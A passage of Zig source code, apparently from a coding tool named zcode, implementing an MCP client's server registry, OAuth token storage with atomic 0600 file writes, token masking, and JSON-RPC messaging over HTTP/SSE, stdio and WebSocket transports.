        else => return err,
    };
    defer allocator.free(bytes);

    // Catch malformed JSON at the registry level so `mcp list` /
    // `mcp remove` / etc. don't bubble up `error: SyntaxError
    // (provider=..., model=...)` through the agent-runtime error
    // envelope, which looked like an LLM crash. Name the file and
    // point the operator at the fix.
    var parsed = std.json.parseFromSlice(std.json.Value, allocator, bytes, .{}) catch |err| switch (err) {
        error.SyntaxError, error.UnexpectedToken, error.InvalidCharacter, error.UnexpectedEndOfInput => {
            std_io.stderrWriter().print(
                "error: mcp: registry file is not valid JSON ({s}): {s}\n  - Fix or delete the file; zcode will regenerate it on next `mcp add`.\n",
                .{ @errorName(err), registry_path },
            ) catch {};
            return error.InvalidMcpRegistry;
        },
        else => return err,
    };
    defer parsed.deinit();

    if (parsed.value != .array) {
        return allocator.alloc(Server, 0);
    }

    var out = std.array_list.Managed(Server).init(allocator);
    // Free appended entries' owned strings on error exit; old `defer
    // out.deinit()` only freed the backing storage and leaked name +
    // transport dupes for every already-appended entry.
    errdefer {
        for (out.items) |server| {
            allocator.free(server.name);
            allocator.free(server.transport);
        }
        out.deinit();
    }

    for (parsed.value.array.items) |item| {
        if (item != .object) continue;
        const name = getString(item.object, "name") orelse continue;
        const transport = getString(item.object, "transport") orelse continue;
        try appendServerEntry(allocator, &out, name, transport);
    }

    return out.toOwnedSlice();
}

fn writeServers(allocator: std.mem.Allocator, registry_path: []const u8, servers: []const Server) !void {
    var buf = std_io.StringBuilder.init(allocator);
    defer buf.deinit();

    try buf.writer().writeByte('[');
    for (servers, 0..) |server, idx| {
        if (idx > 0) try buf.writer().writeByte(',');
        try buf.writer().print("{f}", .{std.json.fmt(.{ .name = server.name, .transport = server.transport }, .{})});
    }
    try buf.writer().writeAll("]\n");

    // Atomic write: a SIGINT in the truncate->writeAll window would
    // zero the registry and drop every MCP server the user has added
    // with `mcp add ...`. Same discipline as keychain.zig (pass 64),
    // logger.zig (pass 65), control_plane.zig (pass 66),
    // security.zig (pass 67), marketplace.zig (pass 68).
    try writeMcpRegistryAtomic(allocator, registry_path, buf.items());
}

fn writeMcpRegistryAtomic(allocator: std.mem.Allocator, target: []const u8, bytes: []const u8) !void {
    var nonce: [8]u8 = undefined;
    rng.secureBytes(&nonce);
    const tmp_path = try std.fmt.allocPrint(allocator, "{s}.tmp.{x}{x}{x}{x}{x}{x}{x}{x}", .{
        target, nonce[0], nonce[1], nonce[2], nonce[3], nonce[4], nonce[5], nonce[6], nonce[7],
    });
    defer allocator.free(tmp_path);
    errdefer std.Io.Dir.cwd().deleteFile(rt.io, tmp_path) catch {};

    {
        const file = try std.Io.Dir.cwd().createFile(rt.io, tmp_path, .{ .truncate = true, .permissions = std.Io.File.Permissions.fromMode(0o600) });
        defer file.close(rt.io);
        try file.writeStreamingAll(rt.io, bytes);
        file.sync(rt.io) catch {};
        file.setPermissions(rt.io, std.Io.File.Permissions.fromMode(0o600)) catch {};
    }
    try std.Io.Dir.renameAbsolute(tmp_path, target, rt.io);
}

fn readAuthEntries(allocator: std.mem.Allocator, auth_path: []const u8) ![]AuthEntry {
    const bytes = std.Io.Dir.cwd().readFileAlloc(rt.io, auth_path, allocator, .limited(256 * 1024)) catch |err| switch (err) {
        error.FileNotFound => return allocator.alloc(AuthEntry, 0),
        else => return err,
    };
    defer allocator.free(bytes);

    var parsed = try std.json.parseFromSlice(std.json.Value, allocator, bytes, .{});
    defer parsed.deinit();
    if (parsed.value != .array) return allocator.alloc(AuthEntry, 0);

    var out = std.array_list.Managed(AuthEntry).init(allocator);
    // Free every already-parsed entry's owned strings on error exit.
    // Previously `defer out.deinit()` only freed the storage and leaked
    // every appended entry's {server, scheme, token, ...} dupes.
    errdefer {
        for (out.items) |entry| {
            allocator.free(entry.server);
            allocator.free(entry.scheme);
            allocator.free(entry.token);
            if (entry.refresh_token) |v| allocator.free(v);
            allocator.free(entry.auth_mode);
            if (entry.client_id) |v| allocator.free(v);
            if (entry.token_endpoint) |v| allocator.free(v);
        }
        out.deinit();
    }
    for (parsed.value.array.items) |item| {
        if (item != .object) continue;
        const server = getString(item.object, "server") orelse continue;
        const scheme = getString(item.object, "scheme") orelse "bearer";
        const token = getString(item.object, "token") orelse continue;
        const updated_ts = getInteger(item.object, "updated_ts") orelse 0;
        try out.ensureUnusedCapacity(1);
        const cloned = try cloneAuthEntry(
            allocator,
            server,
            scheme,
            token,
            updated_ts,
            getString(item.object, "refresh_token"),
            getInteger(item.object, "expires_ts"),
            getString(item.object, "auth_mode") orelse "manual",
            getString(item.object, "client_id"),
            getString(item.object, "token_endpoint"),
        );
        out.appendAssumeCapacity(cloned);
    }
    return out.toOwnedSlice();
}

fn writeAuthEntries(allocator: std.mem.Allocator, auth_path: []const u8, entries: []const AuthEntry) !void {
    const parent = std.fs.path.dirname(auth_path) orelse return error.InvalidPath;
    try paths.ensureDir(parent);

    var buf = std_io.StringBuilder.init(allocator);
    defer buf.deinit();

    try buf.writer().writeByte('[');
    for (entries, 0..) |entry, idx| {
        if (idx > 0) try buf.writer().writeByte(',');
        try buf.writer().print("{f}", .{std.json.fmt(.{
            .server = entry.server,
            .scheme = entry.scheme,
            .token = entry.token,
            .updated_ts = entry.updated_ts,
            .refresh_token = entry.refresh_token,
            .expires_ts = entry.expires_ts,
            .auth_mode = entry.auth_mode,
            .client_id = entry.client_id,
            .token_endpoint = entry.token_endpoint,
        }, .{})});
    }
    try buf.writer().writeAll("]\n");

    // Atomic tmp+rename so a crash or cancel mid-write does not leave
    // the auth file truncated -- losing every OAuth token would force
    // the user to reauthenticate every MCP server. mode=0o600 at
    // creation keeps the bearer tokens off any shared read path even
    // momentarily.
    const tmp_path = try std.fmt.allocPrint(allocator, "{s}.tmp.{d}", .{ auth_path, clock.nowNanos() });
    defer allocator.free(tmp_path);
    errdefer std.Io.Dir.cwd().deleteFile(rt.io, tmp_path) catch {};

    {
        const file = try std.Io.Dir.cwd().createFile(rt.io, tmp_path, .{ .truncate = true, .permissions = std.Io.File.Permissions.fromMode(0o600) });
        defer file.close(rt.io);
        try file.writeStreamingAll(rt.io, buf.items());
        file.sync(rt.io) catch {};
        file.setPermissions(rt.io, std.Io.File.Permissions.fromMode(0o600)) catch {};
    }
    try std.Io.Dir.renameAbsolute(tmp_path, auth_path, rt.io);
}

const getString = parsers.getString;
const getInteger = parsers.getInteger;

pub fn freeServers(allocator: std.mem.Allocator, servers: []Server) void {
    for (servers) |server| {
        allocator.free(server.name);
        allocator.free(server.transport);
    }
    allocator.free(servers);
}

/// Concatenate several owned `[]ValidationError` slices into one owned slice,
/// MOVING each element (the caller must clear its handles afterward so they are
/// not double-freed). The backing slices are freed here; the elements live on in
/// the returned slice, which the caller (mergeScopes) takes over.
fn concatValidationErrors(
    allocator: std.mem.Allocator,
    groups: []const []mcp_config.ValidationError,
) ![]mcp_config.ValidationError {
    var total: usize = 0;
    for (groups) |g| total += g.len;
    if (total == 0) {
        for (groups) |g| if (g.len > 0) allocator.free(g);
        return &.{};
    }
    var out = try allocator.alloc(mcp_config.ValidationError, total);
    var i: usize = 0;
    for (groups) |g| {
        for (g) |e| {
            out[i] = e;
            i += 1;
        }
        if (g.len > 0) allocator.free(g);
    }
    return out;
}

/// Render a structured `ServerConfig` as a legacy transport string so the
/// merged scoped set can be surfaced through the flat `Server{name, transport}`
/// shape that `mcp list` / the suggestion path expect. A remote server renders
/// as its url; an stdio server renders as `command arg arg ...`. The caller owns
/// the returned slice.
fn transportStringForConfig(allocator: std.mem.Allocator, cfg: *const mcp_config.ServerConfig) ![]u8 {
    if (cfg.type.isRemote()) {
        return allocator.dupe(u8, cfg.url orelse "");
    }
    var buf = std_io.StringBuilder.init(allocator);
    defer buf.deinit();
    try buf.writer().writeAll(cfg.command orelse "");
    for (cfg.args) |a| {
        try buf.writer().writeByte(' ');
        try buf.writer().writeAll(a);
    }
    return buf.toOwnedSlice();
}

pub fn freeToolInfos(allocator: std.mem.Allocator, tools: []ToolInfo) void {
    for (tools) |tool| {
        allocator.free(tool.name);
        allocator.free(tool.description);
        allocator.free(tool.input_schema);
    }
    allocator.free(tools);
}

pub fn freeResourceInfos(allocator: std.mem.Allocator, resources: []ResourceInfo) void {
    for (resources) |resource| {
        allocator.free(resource.uri);
        allocator.free(resource.name);
        allocator.free(resource.description);
        allocator.free(resource.mime_type);
    }
    allocator.free(resources);
}

pub fn freeResourceTemplateInfos(allocator: std.mem.Allocator, templates: []ResourceTemplateInfo) void {
    for (templates) |template| {
        allocator.free(template.uri_template);
        allocator.free(template.name);
        allocator.free(template.description);
        allocator.free(template.mime_type);
    }
    allocator.free(templates);
}

pub fn freeResourceContents(allocator: std.mem.Allocator, resources: []ResourceContent) void {
    for (resources) |resource| {
        allocator.free(resource.uri);
        allocator.free(resource.mime_type);
        if (resource.text) |value| allocator.free(value);
        if (resource.blob_base64) |value| allocator.free(value);
    }
    allocator.free(resources);
}

pub fn freePromptInfos(allocator: std.mem.Allocator, prompts: []PromptInfo) void {
    for (prompts) |prompt| {
        allocator.free(prompt.name);
        allocator.free(prompt.description);
        for (prompt.arguments) |arg| {
            allocator.free(arg.name);
            allocator.free(arg.description);
        }
        allocator.free(prompt.arguments);
    }
    allocator.free(prompts);
}

pub fn freeAuthStatuses(allocator: std.mem.Allocator, statuses: []AuthStatus) void {
    for (statuses) |entry| {
        allocator.free(entry.server);
        allocator.free(entry.scheme);
        allocator.free(entry.masked_token);
        allocator.free(entry.auth_mode);
    }
    allocator.free(statuses);
}

pub fn freeRootInfos(allocator: std.mem.Allocator, roots: []RootInfo) void {
    for (roots) |root| {
        allocator.free(root.uri);
        allocator.free(root.name);
    }
    allocator.free(roots);
}

pub fn freeNotificationEvents(allocator: std.mem.Allocator, notifications: []NotificationEvent) void {
    for (notifications) |event| {
        allocator.free(event.server);
        allocator.free(event.method);
        allocator.free(event.params_json);
    }
    allocator.free(notifications);
}

fn freeAuthEntries(allocator: std.mem.Allocator, entries: []AuthEntry) void {
    for (entries) |entry| {
        allocator.free(entry.server);
        allocator.free(entry.scheme);
        allocator.free(entry.token);
        if (entry.refresh_token) |value| allocator.free(value);
        allocator.free(entry.auth_mode);
        if (entry.client_id) |value| allocator.free(value);
        if (entry.token_endpoint) |value| allocator.free(value);
    }
    allocator.free(entries);
}

fn shouldRefreshToken(entry: AuthEntry) bool {
    const expires_ts = entry.expires_ts orelse return false;
    return expires_ts <= (clock.nowSeconds() + 60);
}

fn authHeaders(allocator: std.mem.Allocator, auth_token: ?[]const u8) ![]const []const u8 {
    if (auth_token == null) return allocator.alloc([]const u8, 0);

    const header = try std.fmt.allocPrint(allocator, "Authorization: Bearer {s}", .{auth_token.?});
    errdefer allocator.free(header);

    const out = try allocator.alloc([]const u8, 1);
    out[0] = header;
    return out;
}

fn freeOwnedStrings(allocator: std.mem.Allocator, values: []const []const u8) void {
    for (values) |value| allocator.free(value);
    allocator.free(values);
}

fn maskToken(allocator: std.mem.Allocator, token: []const u8) ![]u8 {
    if (token.len <= 6) return allocator.dupe(u8, "***");
    return std.fmt.allocPrint(allocator, "{s}***{s}", .{ token[0..4], token[token.len - 2 ..] });
}

const initParamsJson =
    "{\"protocolVersion\":\"2025-11-25\",\"capabilities\":{\"roots\":{\"listChanged\":false},\"sampling\":{},\"elicitation\":{\"form\":{},\"url\":{}}},\"clientInfo\":{\"name\":\"zcode\",\"version\":" ++
    "\"" ++ build_options.app_version ++ "\"" ++ "}}";

fn isHttpTransport(transport: []const u8) bool {
    return std.mem.startsWith(u8, transport, "http://") or std.mem.startsWith(u8, transport, "https://");
}

fn isWebSocketTransport(transport: []const u8) bool {
    return std.mem.startsWith(u8, transport, "ws://") or std.mem.startsWith(u8, transport, "wss://");
}

fn defaultPortForScheme(scheme: []const u8) u16 {
    if (std.ascii.eqlIgnoreCase(scheme, "https") or std.ascii.eqlIgnoreCase(scheme, "wss")) return 443;
    return 80;
}

fn buildToolCallParams(allocator: std.mem.Allocator, tool_name: []const u8, payload: []const u8) ![]u8 {
    const trimmed = std.mem.trim(u8, payload, " \t\r\n");
    const arguments_json = if (trimmed.len == 0)
        try allocator.dupe(u8, "{}")
    else if (looksLikeJsonDocument(trimmed))
        try allocator.dupe(u8, trimmed)
    else
        try encodeJsonAlloc(allocator, .{ .input = trimmed });
    defer allocator.free(arguments_json);

    var buf = std_io.StringBuilder.init(allocator);
    defer buf.deinit();
    try buf.writer().writeAll("{\"name\":");
    try appendJsonString(buf.writer(), tool_name);
    try buf.writer().writeAll(",\"arguments\":");
    try buf.writer().writeAll(arguments_json);
    try buf.writer().writeByte('}');
    return buf.toOwnedSlice();
}

fn buildPromptGetParams(allocator: std.mem.Allocator, prompt_name: []const u8, arguments_json: ?[]const u8) ![]u8 {
    const args_json = blk: {
        if (arguments_json) |raw| {
            const trimmed = std.mem.trim(u8, raw, " \t\r\n");
            if (trimmed.len > 0) break :blk trimmed;
        }
        break :blk "{}";
    };

    var buf = std_io.StringBuilder.init(allocator);
    defer buf.deinit();
    try buf.writer().writeAll("{\"name\":");
    try appendJsonString(buf.writer(), prompt_name);
    try buf.writer().writeAll(",\"arguments\":");
    try buf.writer().writeAll(args_json);
    try buf.writer().writeByte('}');
    return buf.toOwnedSlice();
}

fn buildCompletionParams(allocator: std.mem.Allocator, ref_json: []const u8, argument_name: []const u8, value: ?[]const u8) ![]u8 {
    const trimmed_ref = std.mem.trim(u8, ref_json, " \t\r\n");
    if (!looksLikeJsonDocument(trimmed_ref)) return error.InvalidArgument;

    var buf = std_io.StringBuilder.init(allocator);
    defer buf.deinit();
    try buf.writer().writeAll("{\"ref\":");
    try buf.writer().writeAll(trimmed_ref);
    try buf.writer().writeAll(",\"argument\":{\"name\":");
    try appendJsonString(buf.writer(), argument_name);
    if (value) |raw_value| {
        try buf.writer().writeAll(",\"value\":");
        try appendJsonString(buf.writer(), raw_value);
    }
    try buf.writer().writeByte('}');
    try buf.writer().writeByte('}');
    return buf.toOwnedSlice();
}

fn buildCursorParams(allocator: std.mem.Allocator, cursor: ?[]const u8) ![]u8 {
    if (cursor) |value| return encodeJsonAlloc(allocator, .{ .cursor = value });
    return allocator.dupe(u8, "{}");
}

fn looksLikeJsonDocument(input: []const u8) bool {
    const trimmed = std.mem.trim(u8, input, " \t\r\n");
    if (trimmed.len == 0) return false;
    return trimmed[0] == '{' or trimmed[0] == '[';
}

fn appendJsonString(writer: anytype, value: []const u8) !void {
    try writer.print("{f}", .{std.json.fmt(value, .{})});
}

fn encodeRpcRequestRawParamsAlloc(allocator: std.mem.Allocator, id: i64, method: []const u8, params_json: []const u8) ![]u8 {
    var buf = std_io.StringBuilder.init(allocator);
    defer buf.deinit();
    try buf.writer().writeAll("{\"jsonrpc\":\"2.0\",\"id\":");
    try buf.writer().print("{d}", .{id});
    try buf.writer().writeAll(",\"method\":");
    try appendJsonString(buf.writer(), method);
    try buf.writer().writeAll(",\"params\":");
    try buf.writer().writeAll(params_json);
    try buf.writer().writeByte('}');
    return buf.toOwnedSlice();
}

fn encodeRpcNotificationRawParamsAlloc(allocator: std.mem.Allocator, method: []const u8, params_json: []const u8) ![]u8 {
    var buf = std_io.StringBuilder.init(allocator);
    defer buf.deinit();
    try buf.writer().writeAll("{\"jsonrpc\":\"2.0\",\"method\":");
    try appendJsonString(buf.writer(), method);
    try buf.writer().writeAll(",\"params\":");
    try buf.writer().writeAll(params_json);
    try buf.writer().writeByte('}');
    return buf.toOwnedSlice();
}

const ParsedCurlHttpResponse = struct {
    status_code: u16,
    body: []const u8,
    session_id: ?[]const u8,
};

fn parseCurlHttpResponse(raw: []const u8, marker: []const u8) ?ParsedCurlHttpResponse {
    const marker_idx = std.mem.lastIndexOf(u8, raw, marker) orelse return null;
    const status_slice = std.mem.trim(u8, raw[marker_idx + marker.len ..], " \t\r\n");
    const status_code = std.fmt.parseInt(u16, status_slice, 10) catch return null;

    const prelude = raw[0..marker_idx];
    var body_start: usize = 0;
    var headers: []const u8 = "";

    while (body_start < prelude.len and startsWithHttpStatusLine(prelude[body_start..])) {
        const header_end = headerTerminatorIndex(prelude[body_start..]) orelse break;
        headers = prelude[body_start .. body_start + header_end.end_index];
        body_start += header_end.total_len;
        if (body_start >= prelude.len or !startsWithHttpStatusLine(prelude[body_start..])) break;
    }

    return .{
        .status_code = status_code,
        .body = prelude[body_start..],
        .session_id = headerValue(headers, "Mcp-Session-Id"),
    };
}

const HeaderEnd = struct {
    end_index: usize,
    total_len: usize,
};

fn startsWithHttpStatusLine(input: []const u8) bool {
    return std.mem.startsWith(u8, input, "HTTP/");
}

fn headerTerminatorIndex(input: []const u8) ?HeaderEnd {
    if (std.mem.indexOf(u8, input, "\r\n\r\n")) |idx| {
        return .{ .end_index = idx, .total_len = idx + 4 };
    }
    if (std.mem.indexOf(u8, input, "\n\n")) |idx| {
        return .{ .end_index = idx, .total_len = idx + 2 };
    }
    return null;
}

fn headerValue(headers: []const u8, name: []const u8) ?[]const u8 {
    var lines = std.mem.splitScalar(u8, headers, '\n');
    _ = lines.next() orelse return null;

    while (lines.next()) |line_raw| {
        const line = std.mem.trim(u8, line_raw, " \t\r");
        if (line.len == 0) continue;
        const colon = std.mem.indexOfScalar(u8, line, ':') orelse continue;
        const key = std.mem.trim(u8, line[0..colon], " \t");
        if (!std.ascii.eqlIgnoreCase(key, name)) continue;
        return std.mem.trim(u8, line[colon + 1 ..], " \t");
    }
    return null;
}

fn ensureHttpStatusOk(status_code: u16, body: []const u8) !void {
    if (status_code < 400) return;
    if (status_code == 401 or status_code == 403) return error.AuthenticationFailed;
    if (status_code == 429) return error.RateLimited;
    if (status_code == 404) return error.NotFound;
    if (status_code == 409) return error.HttpConflict;
    if (containsIgnoreCase(body, "invalid api key")) return error.AuthenticationFailed;
    return error.HttpStatusCode;
}

const containsIgnoreCase = @import("../core/parse_helpers.zig").containsIgnoreCase;

/// Format a /mcp test <server> result line, optionally extending it
/// with the server-authored instructions block when the server sent
/// one at handshake. Shared across websocket / http / stdio paths so
/// every transport renders the same shape and instructions surface
/// uniformly in the REPL.
fn formatServerTestResult(
    allocator: std.mem.Allocator,
    name: []const u8,
    mode: []const u8,
    protocol: []const u8,
    server_name_info: []const u8,
    server_version: []const u8,
    session_state: ?[]const u8,
    auth_token: ?[]u8,
    instructions: ?[]u8,
) ![]u8 {
    const auth_label: []const u8 = if (auth_token != null) "configured" else "none";

    var out = std_io.StringBuilder.init(allocator);
    errdefer out.deinit();
    const w = out.writer();

    if (session_state) |state| {
        try w.print(
            "MCP server {s} ok mode={s} protocol={s} server={s}/{s} session={s} auth={s}",
            .{ name, mode, protocol, server_name_info, server_version, state, auth_label },
        );
    } else {
        try w.print(
            "MCP server {s} ok mode={s} protocol={s} server={s}/{s} auth={s}",
            .{ name, mode, protocol, server_name_info, server_version, auth_label },
        );
    }

    if (instructions) |text| {
        const trimmed = std.mem.trim(u8, text, " \t\r\n");
        if (trimmed.len > 0) {
            try w.writeAll("\n\nserver instructions:\n");
            try w.writeAll(trimmed);
        }
    }

    return out.toOwnedSlice();
}

fn extractRpcEnvelopeJson(self: *Client, server_name: []const u8, body: []const u8, expected_id: i64, http_ctx: ?HttpSseReplyContext) ![]u8 {
    const trimmed = std.mem.trim(u8, body, " \t\r\n");
    if (trimmed.len == 0) return error.InvalidResponse;

    if (std.mem.indexOf(u8, trimmed, "data:") != null) {
        if (try extractRpcEnvelopeFromSse(self, server_name, trimmed, expected_id, http_ctx)) |payload| {
            return payload;
        }
        return error.InvalidResponse;
    }

    return self.allocator.dupe(u8, trimmed);
}

fn extractRpcEnvelopeFromSse(self: *Client, server_name: []const u8, raw: []const u8, expected_id: i64, http_ctx: ?HttpSseReplyContext) !?[]u8 {
    var frame_data = std_io.StringBuilder.init(self.allocator);
    defer frame_data.deinit();

    var lines = std.mem.splitScalar(u8, raw, '\n');
    var fallback: ?[]u8 = null;
    errdefer if (fallback) |value| self.allocator.free(value);

    while (lines.next()) |line_raw| {
        const line = std.mem.trim(u8, line_raw, " \t\r");
        if (line.len == 0) {
            if (frame_data.items().len > 0) {
                try maybeReplyToClientRequestFromJson(self, server_name, frame_data.items(), http_ctx);
                try maybeRecordNotificationFromJson(self, server_name, frame_data.items());
                if (jsonRpcMatchesId(frame_data.items(), expected_id)) {
                    return try self.allocator.dupe(u8, std.mem.trim(u8, frame_data.items(), " \t\r\n"));
                }
                if (fallback == null and looksLikeJsonDocument(frame_data.items())) {
                    fallback = try self.allocator.dupe(u8, std.mem.trim(u8, frame_data.items(), " \t\r\n"));
                }
                frame_data.clearRetainingCapacity();
            }
            continue;
        }

        if (!std.mem.startsWith(u8, line, "data:")) continue;
        const data = std.mem.trim(u8, line["data:".len..], " \t");
        if (std.mem.eql(u8, data, "[DONE]") or data.len == 0) continue;
        if (frame_data.items().len > 0) try frame_data.append('\n');
        try frame_data.appendSlice(data);
    }

    if (frame_data.items().len > 0) {
        try maybeReplyToClientRequestFromJson(self, server_name, frame_data.items(), http_ctx);
        try maybeRecordNotificationFromJson(self, server_name, frame_data.items());
        if (jsonRpcMatchesId(frame_data.items(), expected_id)) {
            if (fallback) |value| self.allocator.free(value);
            return try self.allocator.dupe(u8, std.mem.trim(u8, frame_data.items(), " \t\r\n"));
        }
        if (fallback == null and looksLikeJsonDocument(frame_data.items())) {
            fallback = try self.allocator.dupe(u8, std.mem.trim(u8, frame_data.items(), " \t\r\n"));
        }
    }

    return fallback;
}

fn jsonRpcMatchesId(payload: []const u8, expected_id: i64) bool {
    var arena = std.heap.ArenaAllocator.init(std.heap.page_allocator);
    defer arena.deinit();

    var parsed = std.json.parseFromSlice(std.json.Value, arena.allocator(), payload, .{}) catch return false;
    defer parsed.deinit();

    if (parsed.value != .object) return false;
    const id_val = parsed.value.object.get("id") orelse return false;
    return switch (id_val) {
        .integer => |n| n == expected_id,
        .string => |s| (std.fmt.parseInt(i64, s, 10) catch return false) == expected_id,
        .number_string => |s| (std.fmt.parseInt(i64, s, 10) catch return false) == expected_id,
        else => false,
    };
}

fn maybeRecordNotificationFromJson(self: *Client, server_name: []const u8, payload: []const u8) !void {
    var parsed = std.json.parseFromSlice(std.json.Value, self.allocator, payload, .{}) catch return;
    defer parsed.deinit();
    if (parsed.value != .object) return;
    const method_val = parsed.value.object.get("method") orelse return;
    if (method_val != .string) return;
    if (parsed.value.object.get("id") != null) return;
    const params_json = if (parsed.value.object.get("params")) |params|
        try jsonValueAlloc(self.allocator, params)
    else
        try self.allocator.dupe(u8, "{}");
    defer self.allocator.free(params_json);
    try self.recordNotification(server_name, method_val.string, params_json);
}

fn maybeReplyToClientRequestFromJson(self: *Client, server_name: []const u8, payload: []const u8, http_ctx: ?HttpSseReplyContext) !void {
    const ctx = http_ctx orelse return;

    var parsed = std.json.parseFromSlice(std.json.Value, self.allocator, payload, .{}) catch return;
    defer parsed.deinit();
    if (parsed.value != .object) return;
    const method_val = parsed.value.object.get("method") orelse return;
    if (method_val != .string) return;
    if (parsed.value.object.get("id") == null) return;

    const reply = try buildClientRequestResponseAlloc(self, server_name, parsed.value.object, method_val.string);
    defer if (reply) |value| self.allocator.free(value);
    if (reply == null) return;

    var response = try self.postHttpRpc(ctx.transport, reply.?, ctx.auth_token, ctx.session_id, ctx.protocol_version, connectionTimeoutMs());
    defer response.deinit(self.allocator);
    try ensureHttpStatusOk(response.status_code, response.body);
    if (response.session_id) |session_id| try self.putHttpSession(server_name, session_id, null);
}

const parseInitializeInfo = parsers.parseInitializeInfo;

fn writeRpcFrame(writer: anytype, payload: []const u8, mode: RpcFrameMode) !void {
    switch (mode) {
        .content_length => {
            var header: [64]u8 = undefined;
            const prefix = try std.fmt.bufPrint(&header, "Content-Length: {d}\r\n\r\n", .{payload.len});
            try writer.writeAll(prefix);
            try writer.writeAll(payload);
        },
        .jsonl => {
            try writer.writeAll(payload);
            try writer.writeAll("\n");
        },
    }
}

fn sendInitialize(self: *Client, server_name: []const u8, stdin_file: std.Io.File, stdout_file: std.Io.File, timeout_ms: u32, request_mode: RpcFrameMode) !InitializeHandshake {
    const writer = std_io.fileWriter(stdin_file);
    const init_req = try encodeRpcRequestRawParamsAlloc(self.allocator, 1, "initialize", initParamsJson);
    defer self.allocator.free(init_req);
    try writeRpcFrame(writer, init_req, request_mode);

    const init_resp = try readRpcResponseById(self, server_name, stdout_file, stdin_file, 1, timeout_ms);
    errdefer self.allocator.free(init_resp.payload);

    const initialized = try encodeRpcNotificationRawParamsAlloc(self.allocator, "notifications/initialized", "{}");
    defer self.allocator.free(initialized);
    try writeRpcFrame(writer, initialized, init_resp.mode);

    return .{
        .response_json = init_resp.payload,
        .mode = init_resp.mode,
    };
}

fn readRpcResponseById(self: *Client, server_name: []const u8, file: std.Io.File, outbound: std.Io.File, expected_id: i64, timeout_ms: u32) !RpcFrame {
    const deadline_ns = clock.nowNanos() + (@as(i128, @intCast(timeout_ms)) * std.time.ns_per_ms);
    var attempts: usize = 0;
    while (attempts < 16) : (attempts += 1) {
        try http_common.checkCancelled();
        const frame = try readRpcFrame(self.allocator, file, 2 * 1024 * 1024, deadline_ns);
        errdefer self.allocator.free(frame.payload);

        var parsed = std.json.parseFromSlice(std.json.Value, self.allocator, frame.payload, .{}) catch {
            self.allocator.free(frame.payload);
            continue;
        };
        defer parsed.deinit();

        if (parsed.value != .object) {
            self.allocator.free(frame.payload);
            continue;
        }

        if (parsed.value.object.get("method")) |method_value| {
            if (method_value == .string) {
                if (parsed.value.object.get("id") != null) {
                    if (try buildClientRequestResponseAlloc(self, server_name, parsed.value.object, method_value.string)) |reply| {
                        defer self.allocator.free(reply);
                        try writeRpcFrame(std_io.fileWriter(outbound), reply, frame.mode);
                    }
                } else {
                    const params_json = if (parsed.value.object.get("params")) |params|
                        try jsonValueAlloc(self.allocator, params)
                    else
                        try self.allocator.dupe(u8, "{}");
                    defer self.allocator.free(params_json);
                    try self.recordNotification(server_name, method_value.string, params_json);
                }
                self.allocator.free(frame.payload);
                continue;
            }
        }

        if (parsed.value.object.get("id")) |idv| {
            const id_num: i64 = switch (idv) {
                .integer => |n| n,
                .string => |text| std.fmt.parseInt(i64, text, 10) catch {
                    self.allocator.free(frame.payload);
                    continue;
                },
                .number_string => |text| std.fmt.parseInt(i64, text, 10) catch {
                    self.allocator.free(frame.payload);
                    continue;
                },
                else => {
                    self.allocator.free(frame.payload);
                    continue;
                },
            };
            if (id_num == expected_id) return frame;
        }

        self.allocator.free(frame.payload);
    }

    return error.McpResponseTimeout;
}

fn readWebSocketResponseById(self: *Client, server_name: []const u8, connection: *std.http.Client.Connection, expected_id: i64) ![]u8 {
    var attempts: usize = 0;
    while (attempts < 64) : (attempts += 1) {
        try http_common.checkCancelled();
        const message = try readWebSocketTextMessage(self, connection);
        errdefer self.allocator.free(message);

        var parsed = std.json.parseFromSlice(std.json.Value, self.allocator, message, .{}) catch {
            self.allocator.free(message);
            continue;
        };
        defer parsed.deinit();

        if (parsed.value != .object) {
            self.allocator.free(message);
            continue;
        }

        if (parsed.value.object.get("method")) |method_value| {
            if (method_value == .string) {
                if (parsed.value.object.get("id") != null) {
                    if (try buildClientRequestResponseAlloc(self, server_name, parsed.value.object, method_value.string)) |reply| {
                        defer self.allocator.free(reply);
                        try websocket.writeClientTextFrame(connection.writer(), reply);
                        try connection.flush();
                    }
                } else {
                    const params_json = if (parsed.value.object.get("params")) |params|
                        try jsonValueAlloc(self.allocator, params)
                    else
                        try self.allocator.dupe(u8, "{}");
                    defer self.allocator.free(params_json);
                    try self.recordNotification(server_name, method_value.string, params_json);
                }
                self.allocator.free(message);
                continue;
            }
        }

        if (jsonRpcMatchesId(message, expected_id)) {
            return message;
        }

        self.allocator.free(message);
    }

    return error.McpResponseTimeout;
}

fn readWebSocketTextMessage(self: *Client, connection: *std.http.Client.Connection) ![]u8 {
    var out = std_io.StringBuilder.init(self.allocator);
    errdefer out.deinit();
    var saw_text = false;

    while (true) {
        var frame = try websocket.readFrameReader(self.allocator, connection.reader(), .client);
        defer frame.deinit(self.allocator);

        switch (frame.opcode) {
            .ping => {
                try websocket.writeClientPongFrame(connection.writer(), frame.payload);
                try connection.flush();
                continue;
            },
            .pong => continue,
            .close => return error.ConnectionClosed,
            .text => {
                saw_text = true;
                try out.appendSlice(frame.payload);
                if (frame.fin) {
                    if (!std.unicode.utf8ValidateSlice(out.items())) return error.InvalidUtf8;
                    return out.toOwnedSlice();
                }
            },
            .continuation => {
                if (!saw_text) continue;
                try out.appendSlice(frame.payload);
                if (frame.fin) {
                    if (!std.unicode.utf8ValidateSlice(out.items())) return error.InvalidUtf8;
                    return out.toOwnedSlice();
                }
            },
            else => {
                if (saw_text and frame.fin) {
                    if (!std.unicode.utf8ValidateSlice(out.items())) return error.InvalidUtf8;
                    return out.toOwnedSlice();
                }
                continue;
            },
        }
    }
}

fn readRpcFrame(allocator: std.mem.Allocator, file: std.Io.File, max_bytes: usize, deadline_ns: i128) !RpcFrame {
    var buf = std_io.StringBuilder.init(allocator);
    defer buf.deinit();
    var one: [1]u8 = undefined;

    const first = blk: while (true) {
        try waitReadableWithDeadline(file, deadline_ns);
        const n = file.readStreaming(rt.io, &.{&one}) catch |err| switch (err) {
            error.WouldBlock => continue,
            else => return err,
        };
        if (n == 0) return error.EndOfStream;
        switch (one[0]) {
            ' ', '\t', '\r', '\n' => continue,
            else => break :blk one[0],
        }
    };

    try buf.append(first);

    if (first == '{') {
        while (true) {
            if (buf.items().len > max_bytes) return error.BodyTooLarge;
            if (buf.items()[buf.items().len - 1] == '\n') break;
            try waitReadableWithDeadline(file, deadline_ns);
            const n = file.readStreaming(rt.io, &.{&one}) catch |err| switch (err) {
                error.WouldBlock => continue,
                else => return err,
            };
            if (n == 0) break;
            try buf.append(one[0]);
        }
        return .{
